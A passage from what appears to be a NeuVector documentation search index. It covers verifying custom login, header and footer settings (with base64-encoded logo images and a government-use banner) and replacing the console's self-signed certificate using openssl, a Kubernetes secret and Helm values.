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"/>
  </svg>

 restartPolicy: Always   Apply the changes:  kubectl apply -f neuvector-containerd-k8s.yaml   This will apply the customization changes to the UI pages.  ","version":"Next 🚧","tagName":"h3"},{"title":"Verification​","type":1,"pageTitle":"Custom Login, Header and Footer","url":"/next/configuration/customui#verification-1","content":" To verify that the environment variables have been successfully set, you can run the following command:  kubectl get deployment -n neuvector neuvector-manager-pod -o yaml   Check the spec.template.spec.containers.env section to ensure that the desired environment variables are present.  spec: progressDeadlineSeconds: 600 replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: app: neuvector-manager-pod strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: creationTimestamp: null labels: app: neuvector-manager-pod release: neuvector spec: containers: - env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector - name: CUSTOM_PAGE_HEADER_COLOR value: '#ff8c00' - name: CUSTOM_PAGE_HEADER_CONTENT value: WW91IGFyZSBhY2Nlc3NpbmcgYSAmbmJzcDs8Yj4gVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIDwvYj4gICAgICB0aGF0IGlzIHByb3ZpZGVkIGZvciBVU0ctYXV0aG9yaXplZCB1c2Ugb25seS4= - name: CUSTOM_EULA_POLICY value: PGg0PgogIFlvdSBhcmUgYWNjZXNzaW5nIGEgVS5TLiBHb3Zlcm5tZW50IChVU0cpIEluZm9ybWF0aW9uIFN5c3RlbSAoSVMpIHRoYXQgaXMgcHJvdmlkZWQgZm9yIFVTRy1hdXRob3JpemVkIHVzZSBvbmx5LgpCeSB1c2luZyB0aGlzIElTICh3aGljaCBpbmNsdWRlcyBhbnkgZGV2aWNlIGF0dGFjaGVkIHRvIHRoaXMgSVMpLCB5b3UgY29uc2VudCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6CjwvaDQ+CjxwPgotVGhlIFVTRyByb3V0aW5lbHkgaW50ZXJjZXB0cyBhbmQgbW9uaXRvcnMgY29tbXVuaWNhdGlvbnMgb24gdGhpcyBJUyBmb3IgcHVycG9zZXMgaW5jbHVkaW5nLCBidXQgbm90IGxpbWl0ZWQgdG8sIHBlbmV0cmF0aW9uIHRlc3RpbmcsIENPTVNFQyBtb25pdG9yaW5nLCBuZXR3b3JrIG9wZXJhdGlvbnMgYW5kIGRlZmVuc2UsIHBlcnNvbm5lbCBtaXNjb25kdWN0IChQTSksIGxhdyBlbmZvcmNlbWVudCAoTEUpLCBhbmQgY291bnRlcmludGVsbGlnZW5jZSAoQ0kpIGludmVzdGlnYXRpb25zLgo8L3A+CjxwPgotQXQgYW55IHRpbWUsIHRoZSBVU0cgbWF5IGluc3BlY3QgYW5kIHNlaXplIGRhdGEgc3RvcmVkIG9uIHRoaXMgSVMuCjwvcD4K - name: CUSTOM_LOGIN_LOGO value: <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="80" xml:space="preserve" version="1.1" viewBox="0 0 300 80">
    <image width="300" height="80" xlink:href="data:image/png;base64,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"/>
  </svg>

   Console/UI pages after customization:​  Please note that the example is for demonstration purposes only. Make sure to adjust the values according to your needs.   ","version":"Next 🚧","tagName":"h3"},{"title":"Replacing Self-Signed Certificate","type":0,"sectionRef":"#","url":"/next/configuration/console/replacecert","content":"","keywords":"","version":"Next 🚧"},{"title":"Replacing the Self-Signed Certificate with PKCS Certificate for External Access​","type":1,"pageTitle":"Replacing Self-Signed Certificate","url":"/next/configuration/console/replacecert#replacing-the-self-signed-certificate-with-pkcs-certificate-for-external-access","content":" The built-in self-signed certificate used for external access from a browser to the Manager or for the REST API to the Controller can be replaced by a supported PKCS certificate. These should be replaced in both the Manager and Controller deployments. Note: To replace the included certificates for Internal communication between the Controller, Enforcer, and Scanner, please see this section.  The NeuVector web console supports 2 different self-signed certificate types, specifically, the PKCS8 (Private-Key Information Syntax Standard) and PKCS1 (RSA Cryptography Standard). The self-signed certificate can be replaced with either of these PKCS types.  The steps to generate the secret that will be consumed by NeuVector’s web console originating from the key and certificate using either of the PKCS methods will be illustrated below. The important note here is, with the use of the wildcard for the DNS as being part of the alternate-subject-name parameter during the key and certificate creation, this enables the name of your choosing to be mapped to the Management console IP-Address without restricting to a particular CN.  Generate and Use Self-signed Certificate PKCS8 or PCKS1​  Create a key and certificate  PKCS8​  openssl req -x509 -nodes -days 730 -newkey rsa:2048 -keyout tls.key -out tls.pem -config ca.cfg -extensions 'v3_req' Sample ca.cfg [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector [v3_req] keyUsage = keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = *   PKCS1​  openssl genrsa -out tls.key 2048 openssl req -x509 -nodes -days 730 -config openssl.cnf -new -key tls.key -out tls.pem Sample openssl.cnf [req] distinguished_name = req_distinguished_name x509_extensions = v3_req prompt = no [req_distinguished_name] C = US ST = California L = San Jose O = NeuVector Inc. OU = Neuvector CN = Neuvector(PKCS#1) [v3_req] keyUsage = keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1 = *   Create the secret from the generated key and certificate files from above  kubectl create secret generic https-cert -n neuvector --from-file=tls.key --from-file=tls.pem   Edit the yaml directly for the manager and controller deployments to add the mounts  spec: template: spec: containers: volumeMounts: - mountPath: /etc/neuvector/certs/ssl-cert.key name: cert readOnly: true subPath: tls.key - mountPath: /etc/neuvector/certs/ssl-cert.pem name: cert readOnly: true subPath: tls.pem volumes: - name: cert secret: defaultMode: 420 secretName: https-cert   Or update with the helm chart with similar values.yaml  manager: certificate: secret: https-cert keyFile: tls.key pemFile: tls.pem ingress: enabled: true host: %CHANGE_HOST_NAME% ingressClassName: &quot;&quot; path: &quot;/&quot; # or this could be &quot;/api&quot;, but might need &quot;rewrite-target&quot; annotation annotations: ingress.kubernetes.io/protocol: https tls: true secretName: https-cert 